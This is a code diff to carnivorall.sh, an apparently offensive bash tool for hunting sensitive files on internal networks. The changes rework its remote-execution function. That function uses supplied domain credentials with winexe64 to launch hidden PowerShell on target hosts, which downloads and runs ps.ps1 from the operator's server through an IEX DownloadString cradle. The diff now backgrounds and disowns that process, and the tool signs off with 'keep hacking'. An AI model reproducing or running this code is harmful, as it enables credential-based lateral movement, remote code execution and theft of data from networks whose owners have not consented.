@@ -3,8 +3,8 @@
 # Title           :carnivorall.sh
 # Description     :Look for sensitive information on the internal network.
 # Authors         :L0stControl and BFlag
-# Date            :2018/04/12
-# Version         :0.6.2    
+# Date            :2018/04/13
+# Version         :0.6.3    
 # Dependecies     :smbclient / ghostscript / zip / ruby (nokogiri / httparty / colorize / yara 
 #=============================================================================================
 
@@ -419,9 +419,11 @@ function executePowerShell
     PASSWORD=$3
     DOMAIN=$4
     SERVERCEC=$5
-    sleep 1
+    sleep 1 
     ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC/ps.ps1')"
-    winexe64 -U "$DOMAIN\\$USERNAME%$PASSWORD" //"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD" 2>&1 > /dev/null
+    winexe64 -U "$DOMAIN\\$USERNAME%$PASSWORD" //"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD"  2>&1 > /dev/null &
+    PIDWINEXE=$(ps ax |grep winexe64 |grep -v "grep" |awk -F" " '{print $1}' |head -n1)
+    disown $PIDWINEXE > /dev/null
 }
 
 function startZombies
@@ -446,10 +448,10 @@ function startZombies
 
 function exitZombies
 {
+    killall -9 winexe64 > /dev/null
     echo -e "$RED............Scan stopped! keep hacking =)$DEFAULTCOLOR"
-    WINEXEPID=$(ps ax |grep winexe |awk -F" " '{print $1}' |head -n1)
-    kill -9 $PIDCARNIVORALL 2>&1 > /dev/null
-    kill -9 $WINEXEPID 2>&1 > /dev/null
+    sleep 2
+    kill -9 $PIDCARNIVORALL
 }
 
 function searchLocalFilesByName
@@ -575,7 +577,7 @@ elif [ $GOOGLE == "notset" -a $LHOST != "notset" ]; then
         else
             startZombies &
             trap exitZombies 2 # Disable Ctrl-C
-            cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT" 
+            cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT"
         fi
     fi
 
